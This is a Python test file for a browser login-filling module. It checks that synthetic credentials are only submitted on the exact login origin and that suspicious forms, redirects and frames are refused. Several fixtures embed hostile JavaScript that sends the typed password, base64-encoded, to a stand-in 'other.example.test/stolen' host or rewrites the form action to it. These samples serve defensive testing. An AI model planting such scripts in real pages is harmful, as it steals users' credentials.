"""Origin-bound browser login checks use synthetic accounts and intercepted HTTPS.

The ordinary unit tests do not require Chromium. Real DOM/form tests run when
the optional Playwright package and its Chromium installation are available.
No real website, account, credentials or owner browser profile is accessed.
"""

import importlib.util
import json
import os
from pathlib import Path
import tempfile
from types import SimpleNamespace
import unittest
from unittest.mock import patch

from codex_memory.browser_logins import BrowserLogins, _Session, _browser_environment, _origin
from codex_memory.credentials import CredentialError


PROFILE = {"kind": "web", "alias": "synthetic", "origin": "https://login.example.test",
           "login_url": "https://login.example.test/login", "username": "synthetic@example.test",
           "password": "synthetic-browser-test-secret"}
FORM = '''<!doctype html><html><body><form method="post" action="/session">
<label>Email <input type="email" name="username" autocomplete="username"></label>
<label>Password <input type="password" name="password" autocomplete="current-password"></label>
<button type="submit">Sign in</button></form></body></html>'''


class FakeRoute:
    def __init__(self, url, *, method="GET", resource_type="document", navigation=False, redirected=False, credential_header=None):
        async def header_value(name):
            return credential_header if name == "cookie" else None
        self.request = SimpleNamespace(url=url, method=method, resource_type=resource_type,
                                       is_navigation_request=lambda: navigation,
                                       redirected_from=object() if redirected else None,
                                       header_value=header_value)
        self.aborted = False
        self.allowed = False

    async def abort(self, code):
        self.aborted = True

    async def fallback(self):
        self.allowed = True


class BrowserGuardTests(unittest.IsolatedAsyncioTestCase):
    async def test_cross_origin_guard_switches_before_any_credentials_are_filled(self):
        engine = BrowserLogins()
        session = _Session(None, Path("unused"), PROFILE["origin"])
        script = FakeRoute("https://static.example.test/login.js", resource_type="script")
        await engine._guard_request(session, script)
        self.assertTrue(script.allowed)
        session.strict = True
        encoded = FakeRoute("https://static.example.test/encoded", method="POST", resource_type="fetch")
        await engine._guard_request(session, encoded)
        self.assertTrue(encoded.aborted)
        self.assertFalse(encoded.allowed)
        after = FakeRoute("https://static.example.test/image.png", resource_type="image")
        await engine._guard_request(session, after)
        self.assertTrue(after.aborted)

    async def test_initial_static_assets_cannot_send_existing_authenticated_cookies(self):
        engine = BrowserLogins()
        session = _Session(None, Path("unused"), PROFILE["origin"])
        route = FakeRoute("https://static.example.test/login.js", resource_type="script", credential_header="synthetic=value")
        await engine._guard_request(session, route)
        self.assertTrue(route.aborted)

    async def test_initial_foreign_frames_fetches_and_redirects_are_denied(self):
        engine = BrowserLogins()
        for route in (
            FakeRoute("https://other.example.test/frame", navigation=True),
            FakeRoute("https://other.example.test/api", resource_type="fetch"),
            FakeRoute("http://login.example.test/image", resource_type="image"),
        ):
            session = _Session(None, Path("unused"), PROFILE["origin"], navigating=True)
            await engine._guard_request(session, route)
            self.assertTrue(route.aborted)
        session = _Session(None, Path("unused"), PROFILE["origin"], navigating=True)
        same_origin_redirect = FakeRoute(PROFILE["origin"] + "/other", navigation=True, redirected=True)
        await engine._guard_request(session, same_origin_redirect)
        self.assertTrue(same_origin_redirect.aborted)
        self.assertTrue(session.rejected_navigation)

    async def test_https_origin_is_exact_including_port(self):
        self.assertEqual(_origin("https://LOGIN.example.test:443/path?ignored=value"), PROFILE["origin"])
        self.assertNotEqual(_origin("https://login.example.test:444/login"), PROFILE["origin"])
        self.assertNotEqual(_origin("https://login.example.test.evil.test/login"), PROFILE["origin"])
        self.assertIsNone(_origin("https://user:password@login.example.test/login"))
        self.assertIsNone(_origin("http://login.example.test/login"))
        self.assertIsNone(_origin("https://login.example.test:bad/login"))

    async def test_debug_environment_is_not_given_to_browser(self):
        with patch.dict(os.environ, {"DEBUG": "pw:protocol", "PWDEBUG": "1", "DEBUG_FILE": "/tmp/log",
                                    "NODE_OPTIONS": "--inspect", "DISPLAY": ":0"}):
            env = _browser_environment()
        for name in ("DEBUG", "PWDEBUG", "DEBUG_FILE", "NODE_OPTIONS"):
            self.assertNotIn(name, env)
        self.assertEqual(env["DISPLAY"], ":0")

    async def test_relative_xdg_directory_is_ignored(self):
        with patch.dict(os.environ, {"XDG_DATA_HOME": "relative-owner-data"}):
            engine = BrowserLogins()
        self.assertEqual(engine.data_dir, Path.home() / ".local/share/codex-recall/browser-profiles")
        with patch.dict(os.environ, {"XDG_DATA_HOME": "/synthetic-owner-data"}):
            engine = BrowserLogins()
        self.assertEqual(engine.data_dir, Path("/synthetic-owner-data/codex-recall/browser-profiles"))

    async def test_launch_failures_never_return_exception_or_credentials(self):
        async def unavailable(directory, options):
            raise RuntimeError(PROFILE["password"] + " " + PROFILE["username"])
        with tempfile.TemporaryDirectory() as directory:
            engine = BrowserLogins(Path(directory) / "private", context_factory=unavailable)
            result = await engine.login(dict(PROFILE))
            await engine.close()
        self.assertEqual(result["status"], "needs_attention")
        self.assertNotIn(PROFILE["password"], json.dumps(result))
        self.assertNotIn(PROFILE["username"], json.dumps(result))
        self.assertEqual(result["browser_session"], "synthetic")

    async def test_invalid_profile_does_not_echo_password(self):
        engine = BrowserLogins()
        for changes in ({"origin": "https://other.example.test"}, {"kind": "sudo"},
                        {"alias": "../private"}, {"login_url": "http://login.example.test/login"}):
            with self.assertRaises(CredentialError) as caught:
                await engine.login({**PROFILE, **changes})
            self.assertNotIn(PROFILE["password"], str(caught.exception))
            self.assertNotIn(PROFILE["username"], str(caught.exception))


@unittest.skipUnless(importlib.util.find_spec("playwright"), "optional Playwright is not installed")
class RealSyntheticBrowserTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        from playwright.async_api import async_playwright
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.playwright = await async_playwright().start()
        self.addAsyncCleanup(self.playwright.stop)
        if not Path(self.playwright.chromium.executable_path).is_file():
            self.skipTest("optional Chromium is not installed")
        self.html = FORM
        self.redirect = None
        self.requests = []
        self.submissions = []
        self.contexts = []
        self.options = []

        async def factory(directory, options):
            self.options.append(dict(options))
            context = await self.playwright.chromium.launch_persistent_context(str(directory), **options)
            self.contexts.append(context)

            async def synthetic(route):
                request = route.request
                self.requests.append((request.url, request.method))
                if request.method == "POST":
                    self.submissions.append(request.post_data)
                    await route.fulfill(status=200, content_type="text/html", body="<p>Manual MFA next</p>")
                elif request.url == PROFILE["login_url"]:
                    if self.redirect:
                        await route.fulfill(status=302, headers={"location": self.redirect})
                    else:
                        await route.fulfill(status=200, content_type="text/html", body=self.html)
                else:
                    await route.fulfill(status=200, content_type="text/html", body="<p>Synthetic fixture</p>")
            await context.route("**/*", synthetic)
            return context

        self.engine = BrowserLogins(Path(self.temporary.name) / "profiles", headless=True, context_factory=factory)
        self.addAsyncCleanup(self.engine.close)

    async def test_ordinary_form_submits_without_claiming_authentication(self):
        result = await self.engine.login(dict(PROFILE))
        self.assertEqual(result["status"], "submitted")
        self.assertNotIn("authenticated", json.dumps(result))
        self.assertNotIn(PROFILE["password"], json.dumps(result))
        self.assertEqual(len(self.submissions), 1)
        self.assertIn("password=" + PROFILE["password"], self.submissions[0])
        self.assertTrue(self.options[0]["chromium_sandbox"])
        self.assertFalse(self.options[0]["ignore_https_errors"])
        self.assertFalse(self.options[0]["accept_downloads"])
        self.assertEqual(self.options[0]["service_workers"], "block")
        directories = list(self.engine.data_dir.iterdir())
        self.assertEqual(len(directories), 1)
        self.assertEqual(self.engine.data_dir.stat().st_mode & 0o777, 0o700)
        self.assertEqual(directories[0].stat().st_mode & 0o777, 0o700)
        self.assertNotIn(PROFILE["username"], str(directories[0]))

    async def test_get_foreign_and_submit_override_forms_are_not_filled(self):
        variants = (
            FORM.replace('method="post"', 'method="get"'),
            FORM.replace('action="/session"', 'action="https://other.example.test/session"'),
            FORM.replace('type="submit"', 'type="submit" formmethod="get"'),
            FORM.replace('type="submit"', 'type="submit" formaction="https://other.example.test/session"'),
            FORM.replace('type="submit"', 'type="submit" formtarget="_blank"'),
        )
        for html in variants:
            self.html = html
            result = await self.engine.login(dict(PROFILE))
            self.assertEqual(result["status"], "needs_attention")
            page = self.contexts[-1].pages[-1]
            self.assertEqual(await page.locator('input[type="password"]').input_value(), "")
        self.assertEqual(self.submissions, [])

    async def test_signup_hidden_password_and_ambiguous_forms_are_not_filled(self):
        variants = (
            FORM.replace('autocomplete="current-password"', 'autocomplete="new-password"'),
            FORM.replace("Sign in", "Create account"),
            FORM.replace("Sign in", "Continue"),
            FORM.replace("Sign in", "Submit"),
            FORM.replace("Sign in", "Sign in and delete account"),
            FORM.replace('</form>', '<input type="password" name="confirmation" hidden></form>'),
            FORM.replace('</form>', '<input type="text" name="captcha"></form>'),
            FORM.replace('</form>', '<button type="submit">Continue</button></form>'),
            FORM.replace('<form ', '<form style="opacity:0" '),
        )
        for html in variants:
            self.html = html
            result = await self.engine.login(dict(PROFILE))
            self.assertEqual(result["status"], "needs_attention")
        self.assertEqual(self.submissions, [])

    async def test_redirect_and_cross_origin_frame_reject_before_filling(self):
        for redirect in ("https://other.example.test/login", PROFILE["origin"] + "/redirect"):
            self.redirect = redirect
            result = await self.engine.login(dict(PROFILE))
            self.assertEqual(result["status"], "needs_attention")
        self.redirect = None
        self.html = FORM.replace('</body>', '<iframe src="https://other.example.test/frame"></iframe></body>')
        result = await self.engine.login(dict(PROFILE))
        self.assertEqual(result["status"], "needs_attention")
        self.assertEqual(self.submissions, [])
        self.assertFalse(any(url.startswith("https://other.example.test") for url, _ in self.requests))

    async def test_mutation_after_username_fill_stops_before_password_fill(self):
        self.html = FORM.replace('</body>', '''<script>
            document.querySelector('[name="username"]').addEventListener('input', () => {
                document.forms[0].action = 'https://other.example.test/stolen';
            });</script></body>''')
        result = await self.engine.login(dict(PROFILE))
        self.assertEqual(result["status"], "needs_attention")
        self.assertEqual(result["reason"], "form_changed")
        self.assertEqual(await self.contexts[-1].pages[-1].locator('[name="password"]').input_value(), "")
        self.assertEqual(self.submissions, [])

    async def test_encoded_cross_origin_exfiltration_is_blocked_after_fill(self):
        self.html = FORM.replace('</body>', '''<script>
            document.querySelector('[name="password"]').addEventListener('input', e => {
                fetch('https://other.example.test/stolen', {method: 'POST', mode: 'no-cors', body: btoa(e.target.value)}).catch(() => {});
                const image = new Image(); image.src = 'https://other.example.test/leak?encoded=' + btoa(e.target.value);
            });</script></body>''')
        result = await self.engine.login(dict(PROFILE))
        self.assertEqual(result["status"], "submitted")
        self.assertEqual(len(self.submissions), 1)
        self.assertFalse(any(url.startswith("https://other.example.test") for url, _ in self.requests))

    async def test_submit_time_action_change_cannot_send_credentials_off_origin(self):
        self.html = FORM.replace('</body>', '''<script>
            document.forms[0].addEventListener('submit', e => {
                e.target.action = 'https://other.example.test/stolen';
            });</script></body>''')
        result = await self.engine.login(dict(PROFILE))
        self.assertEqual(result["status"], "needs_attention")
        self.assertEqual(self.submissions, [])
        self.assertFalse(any(url.startswith("https://other.example.test") for url, _ in self.requests))

    async def test_context_shutdown_does_not_delete_private_session(self):
        await self.engine.login(dict(PROFILE))
        context = self.contexts[-1]
        await self.engine.close("synthetic")
        self.assertEqual(self.engine._sessions, {})
        self.assertEqual(context.pages, [])
        self.assertTrue(self.engine.data_dir.is_dir())
        for directory in self.engine.data_dir.iterdir():
            self.assertEqual(directory.stat().st_mode & 0o777, 0o700)
